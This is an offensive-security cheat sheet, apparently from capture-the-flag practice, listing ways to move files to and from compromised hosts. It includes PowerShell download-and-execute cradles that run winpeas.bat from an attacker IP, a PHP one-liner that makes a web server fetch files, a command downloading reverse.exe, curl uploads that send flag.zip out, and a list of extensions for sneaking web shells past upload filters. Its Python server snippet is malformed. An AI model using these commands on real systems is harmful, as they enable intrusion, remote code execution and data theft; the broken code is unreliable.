# Linux

wget http://IP:PORT/FILE
# python 
python -m SimpleHTTPServer
python3 -m http.server

## http sever saves POST request data

```python
#!/usr/bin/python 
import SimpleHTTPServer
import BaseHTTPServer class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): 
def do_PUT(self):
	print self.headers
	length = int(self.headers["Content-Length"]) 
	path = self.translate_path(self.path) 
	with open(path, "wb") as dst: 
	    dst.write(self.rfile.read(length)) 

    
 if __name__ == '__main__': 
	SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
```




# Windows 
```powershell
Powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/winpeas.bat')"

IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/winpeas.bat')

Invoke-WebRequest -Uri 10.10.16.4/winpeas.bbat -OutFile winpeas.bat

````


## Certutil
```bash
certutil -urlcache -f http://IP/FILE OUTPUTFILENAME
```


# php
```php
<?php echo exec("powershell -command \"(New-Object System.Net.WebClient).DownloadFile('http://10.10.17.185/FILE_NAME','OUT_FILE_NAME')\""); ?>
```

```powershell
powershell Invoke-WebRequest -Uri http://10.10.16.4/winpeas.bat -OutFile winpeas.bat

powershell Invoke-WebRequest -Uri http://10.10.16.4/reverse.exe -OutFile ke.exe

```

# scp 
scp [OPTION] [user@]SRC_HOST:]file1 user@target:/tmp/FILE:
SCP -i KEY FILE user@target:/tmp/FILE:
-i for ssh key
P - Specifies the remote host ssh port.
-p - Preserves files modification and access times.
-q - Use this option if you want to suppress the progress meter and non-error messages.
-C - This option forces scp to compresses the data as it is sent to the destination machine.
```bash
scp [OPTION] [user@]SRC_HOST:]file1 user@target:/tmp/FILE:

scp charix@10.10.10.84:secret.zip . # getting secret.zip from charix usuer

```
# Curl
```bash
# Upload file with curl
curl DEST_IP --upload-file FILE
curl 192.77.184.2 --upload-file flag.zip
```





# FTP
python -m pyftpdlib 21
ftp 10.10.10.10
# stop service
sc stop SERVICE

sc query SERVICE to check service

sc start SERVICE to start 



```
Invoke-WebRequest -Uri http//192.168.181.128/linPEAS.ps1 -OutFile
File C:\Users\administrator\Documents\WindowsPowerShell\Modules\Recon\adPEAS.ps1
```

# Extension evasion

**File Upload General Methodology**
Other useful extensions:
PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, phar .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module

  Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp

ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
Coldfusion: .cfm, .cfml, .cfc, .dbm
Flash: .swf
Perl: .pl, .cgi
Erlang Yaws Web Server: .yaws




 